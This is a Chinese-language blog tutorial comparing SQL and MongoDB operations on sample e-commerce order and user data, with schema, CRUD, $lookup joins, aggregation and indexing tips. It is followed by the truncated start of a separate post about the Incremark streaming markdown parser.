span::selection{background:#373b41}.hljs::-moz-selection,.hljs span::-moz-selection{background:#373b41}.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#c5c8c6}.hljs-name,.hljs-title{color:#f0c674}.hljs-comment,.hljs-meta,.hljs-meta .hljs-keyword{color:#707880}.hljs-deletion,.hljs-link,.hljs-literal,.hljs-number,.hljs-symbol{color:#c66}.hljs-addition,.hljs-doctag,.hljs-regexp,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string{color:#b5bd68}.hljs-attribute,.hljs-code,.hljs-selector-id{color:#b294bb}.hljs-bullet,.hljs-keyword,.hljs-selector-tag,.hljs-tag{color:#81a2be}.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-variable{color:#8abeb7}.hljs-built_in,.hljs-builtin-name,.hljs-quote,.hljs-section,.hljs-selector-class,.hljs-type{color:#de935f}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>很高兴你能来阅读，过去一年多，我主要从事天猫国际商品以及订单相关数仓开发与数据分析工作。接下来会陆续分享这段经历中的实战问题、对应解决思路，以及数仓基础的进阶学习总结，希望我的分享能给大家带来参考和帮助～</p>
</blockquote>
<h2 data-id="heading-0">MongoDB深入与实战：基于SQL的对照解析</h2>
<p>MongoDB作为主流的文档型NoSQL数据库，其数据模型和查询逻辑与关系型数据库（SQL）存在本质差异，但可通过"概念映射+场景对照"的方式快速掌握。</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31dd45e3b5b74ae1aebdc413a4bf6d8e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5qmZ57yW56CB5pel5b-X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766472271&amp;x-signature=R0gC2K8ARbO0Ilsgnt8f1NwvJOY%3D" alt="image.png" width="70%" loading="lazy"/>
<p>本文从核心概念对应入手，结合高频业务场景，将SQL语句与MongoDB操作进行精准匹配，并延伸MongoDB的进阶特性与实战优化技巧，实现从SQL思维到MongoDB思维的平滑过渡。</p>
<h3 data-id="heading-1">一、基础：MongoDB与SQL核心概念映射</h3>
<p>关系型数据库通过"数据库-表-行-列"组织数据，而MongoDB以"数据库-集合-文档-字段"的文档模型实现，二者核心概念存在明确对应关系，这是后续操作对照的基础。</p>













































<table><thead><tr><th>SQL概念</th><th>MongoDB概念</th><th>核心说明</th></tr></thead><tbody><tr><td>Database（数据库）</td><td>Database（数据库）</td><td>逻辑隔离单元，创建与使用语法相似（如USE db_name）</td></tr><tr><td>Table（表）</td><td>Collection（集合）</td><td>集合无需预定义结构，不同文档可包含不同字段</td></tr><tr><td>Row（行）</td><td>Document（文档）</td><td>以BSON格式（JSON扩展）存储，自带唯一主键_id</td></tr><tr><td>Column（列）</td><td>Field（字段）</td><td>字段类型灵活，支持嵌套文档、数组等复杂类型</td></tr><tr><td>Primary Key（主键）</td><td>_id字段</td><td>默认自动生成ObjectId，也可手动指定（需保证唯一）</td></tr><tr><td>Index（索引）</td><td>Index（索引）</td><td>支持单字段、复合索引等，语法与SQL逻辑相通</td></tr><tr><td>关键差异：MongoDB的"无模式"特性——集合不强制文档结构统一，可根据业务需求动态扩展字段，这与SQL表的固定列结构形成核心区别。</td><td/><td/></tr></tbody></table>
<ol>
<li>传统关系型数据库（如 MySQL）对<strong>非结构化 / 半结构化数据</strong>支持不足，难以高效存储商品属性、用户行为等多变数据。</li>
<li>关系型数据库的<strong>水平扩展能力弱</strong>，面对高并发（如电商大促）时，扩容成本高、效率低。</li>
<li>开发效率需求：MongoDB 采用文档模型，无需预先定义 Schema，迭代速度快，适配互联网产品快速试错的需求。</li>
</ol>
<h3 data-id="heading-2">二、核心场景：SQL与MongoDB操作实战对照</h3>
<p>以下以电商场景的"订单表（orders）"和"用户表（users）"为例，覆盖创建、增删改查、聚合统计等高频操作，实现SQL语句到MongoDB操作的直接映射。</p>
<h4 data-id="heading-3">场景1：结构定义与索引创建</h4>
<p>SQL需先定义表结构，MongoDB则通过插入文档隐式创建集合，索引创建语法逻辑与SQL一致。</p>
<p><strong>SQL实现</strong></p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-comment">-- 创建订单表并定义结构</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> orders (
  id <span class="hljs-type">INT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,
  user_id <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">30</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  order_no <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">UNIQUE</span>,
  amount <span class="hljs-type">DECIMAL</span>(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  status <span class="hljs-type">CHAR</span>(<span class="hljs-number">1</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'P'</span>, <span class="hljs-comment">-- P:待支付 A:已完成 C:已取消</span>
  create_time DATETIME <span class="hljs-keyword">DEFAULT</span> NOW(),
  <span class="hljs-keyword">PRIMARY</span> KEY (id),
  INDEX idx_user_status (user_id, status) <span class="hljs-comment">-- 复合索引</span>
);

<span class="hljs-comment">-- 创建用户表</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> users (
  user_id <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">30</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  username <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  phone <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">20</span>),
  <span class="hljs-keyword">PRIMARY</span> KEY (user_id)
);
</code></pre>
<p><strong>MongoDB实现</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-comment">// 1. 隐式创建集合（插入文档时自动创建）</span>
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">insertOne</span>({
  <span class="hljs-attr">user_id</span>: <span class="hljs-string">"u1001"</span>,
  <span class="hljs-attr">order_no</span>: <span class="hljs-string">"ORD20250001"</span>,
  <span class="hljs-attr">amount</span>: <span class="hljs-number">299.99</span>,
  <span class="hljs-attr">status</span>: <span class="hljs-string">"P"</span>,
  <span class="hljs-attr">create_time</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()
});

<span class="hljs-comment">// 2. 显式创建集合（可选，可添加验证规则）</span>
db.<span class="hljs-title function_">createCollection</span>(<span class="hljs-string">"users"</span>, {
  <span class="hljs-attr">validator</span>: { <span class="hljs-comment">//  Schema验证（模拟SQL字段约束）</span>
    <span class="hljs-attr">$jsonSchema</span>: {
      <span class="hljs-attr">bsonType</span>: <span class="hljs-string">"object"</span>,
      <span class="hljs-attr">required</span>: [<span class="hljs-string">"user_id"</span>, <span class="hljs-string">"username"</span>],
      <span class="hljs-attr">properties</span>: {
        <span class="hljs-attr">user_id</span>: { <span class="hljs-attr">bsonType</span>: <span class="hljs-string">"string"</span> },
        <span class="hljs-attr">username</span>: { <span class="hljs-attr">bsonType</span>: <span class="hljs-string">"string"</span> },
        <span class="hljs-attr">phone</span>: { <span class="hljs-attr">bsonType</span>: <span class="hljs-string">"string"</span> }
      }
    }
  }
});

<span class="hljs-comment">// 3. 创建索引（对应SQL的INDEX）</span>
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">createIndex</span>({ <span class="hljs-attr">user_id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">status</span>: <span class="hljs-number">1</span> }, { <span class="hljs-attr">name</span>: <span class="hljs-string">"idx_user_status"</span> });
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">createIndex</span>({ <span class="hljs-attr">order_no</span>: <span class="hljs-number">1</span> }, { <span class="hljs-attr">unique</span>: <span class="hljs-literal">true</span> }); <span class="hljs-comment">// 唯一索引</span>
db.<span class="hljs-property">users</span>.<span class="hljs-title function_">createIndex</span>({ <span class="hljs-attr">user_id</span>: <span class="hljs-number">1</span> }, { <span class="hljs-attr">unique</span>: <span class="hljs-literal">true</span> });
</code></pre>
<h4 data-id="heading-4">场景2：数据插入操作</h4>
<p>SQL使用INSERT语句，MongoDB提供insertOne（单条）和insertMany（批量）方法，支持自动生成主键。</p>
<p><strong>SQL实现</strong></p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-comment">-- 单条插入</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users(user_id, username, phone)
<span class="hljs-keyword">VALUES</span> ("u1001", "张三", "13800138000");

<span class="hljs-comment">-- 批量插入</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> orders(user_id, order_no, amount, status)
<span class="hljs-keyword">VALUES</span> 
("u1001", "ORD20250002", <span class="hljs-number">159.00</span>, "A"),
("u1002", "ORD20250003", <span class="hljs-number">329.50</span>, "P");
</code></pre>
<p><strong>MongoDB实现</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-comment">// 单条插入（_id自动生成）</span>
db.<span class="hljs-property">users</span>.<span class="hljs-title function_">insertOne</span>({
  <span class="hljs-attr">user_id</span>: <span class="hljs-string">"u1001"</span>,
  <span class="hljs-attr">username</span>: <span class="hljs-string">"张三"</span>,
  <span class="hljs-attr">phone</span>: <span class="hljs-string">"13800138000"</span>
});

<span class="hljs-comment">// 批量插入（效率高于多次insertOne）</span>
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">insertMany</span>([
  {
    <span class="hljs-attr">user_id</span>: <span class="hljs-string">"u1001"</span>,
    <span class="hljs-attr">order_no</span>: <span class="hljs-string">"ORD20250002"</span>,
    <span class="hljs-attr">amount</span>: <span class="hljs-number">159.00</span>,
    <span class="hljs-attr">status</span>: <span class="hljs-string">"A"</span>,
    <span class="hljs-attr">create_time</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()
  },
  {
    <span class="hljs-attr">user_id</span>: <span class="hljs-string">"u1002"</span>,
    <span class="hljs-attr">order_no</span>: <span class="hljs-string">"ORD20250003"</span>,
    <span class="hljs-attr">amount</span>: <span class="hljs-number">329.50</span>,
    <span class="hljs-attr">status</span>: <span class="hljs-string">"P"</span>,
    <span class="hljs-attr">create_time</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()
  }
]);
</code></pre>
<h4 data-id="heading-5">场景3：数据查询操作（单表/关联）</h4>
<p>MongoDB的find方法对应SQL的SELECT，支持条件过滤、字段投影、排序等；多表关联则通过$lookup实现SQL的JOIN逻辑。</p>
<h5 data-id="heading-6">子场景3.1：单表条件查询与排序</h5>
<p><strong>SQL实现</strong></p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-comment">-- 查询u1001用户的已完成订单，按创建时间倒序，只返回订单号、金额、创建时间</span>
<span class="hljs-keyword">SELECT</span> order_no, amount, create_time
<span class="hljs-keyword">FROM</span> orders
<span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> "u1001" <span class="hljs-keyword">AND</span> status <span class="hljs-operator">=</span> "A"
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> create_time <span class="hljs-keyword">DESC</span>;
</code></pre>
<p><strong>MongoDB实现</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">find</span>(
  { <span class="hljs-attr">user_id</span>: <span class="hljs-string">"u1001"</span>, <span class="hljs-attr">status</span>: <span class="hljs-string">"A"</span> }, <span class="hljs-comment">// 条件过滤（对应WHERE）</span>
  { <span class="hljs-attr">order_no</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">amount</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">create_time</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">_id</span>: <span class="hljs-number">0</span> } <span class="hljs-comment">// 字段投影（1显示，0隐藏）</span>
).<span class="hljs-title function_">sort</span>({ <span class="hljs-attr">create_time</span>: -<span class="hljs-number">1</span> }); <span class="hljs-comment">// 排序（-1倒序，1正序）</span>
</code></pre>
<h5 data-id="heading-7">子场景3.2：多表关联查询（用户-订单）</h5>
<p><strong>SQL实现</strong></p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-comment">-- 关联查询用户信息与对应订单，只显示已完成订单</span>
<span class="hljs-keyword">SELECT</span> u.username, u.phone, o.order_no, o.amount
<span class="hljs-keyword">FROM</span> users u
<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> orders o 
  <span class="hljs-keyword">ON</span> u.user_id <span class="hljs-operator">=</span> o.user_id
<span class="hljs-keyword">WHERE</span> o.status <span class="hljs-operator">=</span> "A";
</code></pre>
<p><strong>MongoDB实现</strong></p>
<ul>
<li>说明：这块表关联，我们真实场景 大部分通过Java代码来实现，这里只是给大家举一个案例，仅仅参考。真实的订单表一般都是几千万的数据，个人理解写脚本不太友好;</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-comment">// 用聚合管道的$lookup实现JOIN，$match过滤条件</span>
db.<span class="hljs-property">users</span>.<span class="hljs-title function_">aggregate</span>([
  {
    <span class="hljs-attr">$lookup</span>: { <span class="hljs-comment">// 关联订单集合</span>
      <span class="hljs-attr">from</span>: <span class="hljs-string">"orders"</span>, <span class="hljs-comment">// 关联的目标集合（对应SQL的JOIN表）</span>
      <span class="hljs-attr">localField</span>: <span class="hljs-string">"user_id"</span>, <span class="hljs-comment">// 本地关联字段</span>
      <span class="hljs-attr">foreignField</span>: <span class="hljs-string">"user_id"</span>, <span class="hljs-comment">// 目标集合关联字段</span>
      <span class="hljs-attr">as</span>: <span class="hljs-string">"user_orders"</span> <span class="hljs-comment">// 关联结果存储的字段名</span>
    }
  },
  { <span class="hljs-attr">$unwind</span>: <span class="hljs-string">"$user_orders"</span> }, <span class="hljs-comment">// 拆分数组（将关联结果展开）</span>
  { <span class="hljs-attr">$match</span>: { <span class="hljs-string">"user_orders.status"</span>: <span class="hljs-string">"A"</span> } }, <span class="hljs-comment">// 过滤已完成订单</span>
  {
    <span class="hljs-attr">$project</span>: { <span class="hljs-comment">// 筛选显示字段</span>
      <span class="hljs-attr">username</span>: <span class="hljs-number">1</span>,
      <span class="hljs-attr">phone</span>: <span class="hljs-number">1</span>,
      <span class="hljs-string">"user_orders.order_no"</span>: <span class="hljs-number">1</span>,
      <span class="hljs-string">"user_orders.amount"</span>: <span class="hljs-number">1</span>,
      <span class="hljs-attr">_id</span>: <span class="hljs-number">0</span>
    }
  }
]);
</code></pre>
<h4 data-id="heading-8">场景4：数据更新与删除</h4>
<p>MongoDB通过update系列方法实现更新，支持原子操作符（如<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>e</mi><mi>t</mi><mtext>、</mtext></mrow><annotation encoding="application/x-tex">set、</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal">t</span><span class="mord cjk_fallback">、</span></span></span></span></span>inc），删除则对应deleteOne/deleteMany方法。</p>
<h5 data-id="heading-9">子场景4.1：更新操作（修改订单状态）</h5>
<p><strong>SQL实现</strong></p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-comment">-- 将订单ORD20250002的状态改为已完成，并更新支付时间</span>
<span class="hljs-keyword">UPDATE</span> orders
<span class="hljs-keyword">SET</span> status <span class="hljs-operator">=</span> "A", pay_time <span class="hljs-operator">=</span> NOW()
<span class="hljs-keyword">WHERE</span> order_no <span class="hljs-operator">=</span> "ORD20250002";
</code></pre>
<p><strong>MongoDB实现</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-comment">// updateOne：只更新匹配的第一条；updateMany：更新所有匹配项</span>
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">updateOne</span>(
  { <span class="hljs-attr">order_no</span>: <span class="hljs-string">"ORD20250002"</span> }, <span class="hljs-comment">// 匹配条件</span>
  {
    <span class="hljs-attr">$set</span>: { <span class="hljs-comment">// 原子更新操作符，只修改指定字段</span>
      <span class="hljs-attr">status</span>: <span class="hljs-string">"A"</span>,
      <span class="hljs-attr">pay_time</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()
    }
  }
);
</code></pre>
<h5 data-id="heading-10">子场景4.2：删除操作（清理取消的旧订单）</h5>
<p><strong>SQL实现</strong></p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-comment">-- 删除2024年1月1日前创建的已取消订单</span>
<span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> orders
<span class="hljs-keyword">WHERE</span> status <span class="hljs-operator">=</span> "C" <span class="hljs-keyword">AND</span> create_time <span class="hljs-operator">&lt;</span> "2024-01-01";
</code></pre>
<p><strong>MongoDB实现</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">deleteMany</span>(
  {
    <span class="hljs-attr">status</span>: <span class="hljs-string">"C"</span>,
    <span class="hljs-attr">create_time</span>: { <span class="hljs-attr">$lt</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-string">"2024-01-01"</span>) } <span class="hljs-comment">// $lt对应SQL的&lt;</span>
  }
);
</code></pre>
<h4 data-id="heading-11">场景5：聚合统计（GROUP BY/HAVING）</h4>
<p>MongoDB的聚合管道（Aggregation Pipeline）是核心特性，通过多个阶段组合实现复杂统计，对应SQL的GROUP BY、HAVING等功能。</p>
<p><strong>SQL实现</strong></p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-comment">-- 统计每个用户的已完成订单总金额，筛选总金额&gt;500的用户</span>
<span class="hljs-keyword">SELECT</span> user_id, <span class="hljs-built_in">SUM</span>(amount) <span class="hljs-keyword">AS</span> total_amount, <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">AS</span> order_count
<span class="hljs-keyword">FROM</span> orders
<span class="hljs-keyword">WHERE</span> status <span class="hljs-operator">=</span> "A"
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id
<span class="hljs-keyword">HAVING</span> total_amount <span class="hljs-operator">&gt;</span> <span class="hljs-number">500</span>
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> total_amount <span class="hljs-keyword">DESC</span>;
</code></pre>
<p><strong>MongoDB实现</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">aggregate</span>([
  { <span class="hljs-attr">$match</span>: { <span class="hljs-attr">status</span>: <span class="hljs-string">"A"</span> } }, <span class="hljs-comment">// 1. 先过滤数据（减少后续计算量）</span>
  {
    <span class="hljs-attr">$group</span>: { <span class="hljs-comment">// 2. 分组统计（对应GROUP BY）</span>
      <span class="hljs-attr">_id</span>: <span class="hljs-string">"$user_id"</span>, <span class="hljs-comment">// 分组字段（对应GROUP BY的user_id）</span>
      <span class="hljs-attr">total_amount</span>: { <span class="hljs-attr">$sum</span>: <span class="hljs-string">"$amount"</span> }, <span class="hljs-comment">// 求和（对应SUM(amount)）</span>
      <span class="hljs-attr">order_count</span>: { <span class="hljs-attr">$sum</span>: <span class="hljs-number">1</span> } <span class="hljs-comment">// 计数（对应COUNT(*)）</span>
    }
  },
  { <span class="hljs-attr">$match</span>: { <span class="hljs-attr">total_amount</span>: { <span class="hljs-attr">$gt</span>: <span class="hljs-number">500</span> } } }, <span class="hljs-comment">// 3. 筛选分组结果（对应HAVING）</span>
  { <span class="hljs-attr">$sort</span>: { <span class="hljs-attr">total_amount</span>: -<span class="hljs-number">1</span> } } <span class="hljs-comment">// 4. 排序</span>
]);
</code></pre>
<h3 data-id="heading-12">三、核心差异与最佳实践总结</h3>
<h4 data-id="heading-13">1. SQL与MongoDB核心差异</h4>






























<table><thead><tr><th>维度</th><th>SQL（关系型）</th><th>MongoDB（文档型）</th></tr></thead><tbody><tr><td>数据模型</td><td>固定表结构，需预定义schema</td><td>灵活文档模型，支持动态字段</td></tr><tr><td>关联方式</td><td>通过JOIN实现多表关联</td><td>通过$lookup或嵌套文档实现关联</td></tr><tr><td>查询逻辑</td><td>声明式SQL语句，单条语句完成复杂查询</td><td>聚合管道，多阶段组合实现复杂逻辑</td></tr><tr><td>扩展性</td><td>垂直扩展为主，水平扩展复杂</td><td>原生支持分片，水平扩展能力强</td></tr></tbody></table>
<h4 data-id="heading-14">2. 实战最佳实践</h4>
<p><strong>在我们真实的电商项目中，商品表和订单表都是使用的MongoDB存储的，主要是需求多，经常要新增字段。MySQL不易拓展;</strong></p>
<p><strong>商品数据存储</strong>：电商商品属性多样（如尺码、颜色，保质期等等参数），文档模型可灵活存储不同品类商品的差异化属性，支持快速查询和修改。</p>
<p><strong>订单数据存储</strong>：订单数据字段可能随业务迭代新增（如优惠券抵扣、各种配送备注，拦截时间等等），MongoDB 无需修改表结构即可适配，且查询速度快。</p>
<ul>
<li>
<p><strong>索引必加但不滥加</strong>：针对高频查询创建索引，避免对写入频繁的字段创建过多索引（影响写入性能）。</p>
</li>
<li>
<p><strong>批量操作提升效率</strong>：插入/更新多条数据时，优先使用insertMany/updateMany，减少网络交互。</p>
</li>
<li>
<p><strong>监控与调优</strong>：通过explain()分析查询执行计划，定位全表扫描等性能问题（如db.orders.find({}).explain("executionStats")）。</p>
</li>
</ul>
<hr/>
<p>📣非常感谢你阅读到这里，如果这篇文章对你有帮助，希望能留下你的点赞👍 关注❤️ 分享👥 留言💬thanks！！！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI 时代真正流式解析+渲染双重优化的 Incremark]]></title>    <link>https://juejin.cn/post/7583906846986469422</link>    <guid>https://juejin.cn/post/7583906846986469422</guid>    <pubDate>2025-12-15T02:57:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583906846986469422" data-draft-id="7583613222344769562" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI 时代真正流式解析+渲染双重优化的 Incremark"/> <meta itemprop="keywords" content="前端,Markdown,AI编程"/> <meta itemprop="datePublished" content="2025-12-15T02:57:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="king王一帅"/> <meta itemprop="url" content="https://juejin.cn/user/395479917018408"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI 时代真正流式解析+渲染双重优化的 Incremark
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/395479917018408/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    king王一帅
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T02:57:48.000Z" title="Mon Dec 15 2025 02:57:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">故事的开始</h2>
<p>最初是想要实现富文本编辑器 ai 流式输出的，此过程大致为 <code>ai -&gt; chunk -&gt; parser -&gt; propsemirror JSONContent</code> 实现富文本编辑器中类似 ai 聊天框一样的流式输出，并且要尽量节省性能。</p>
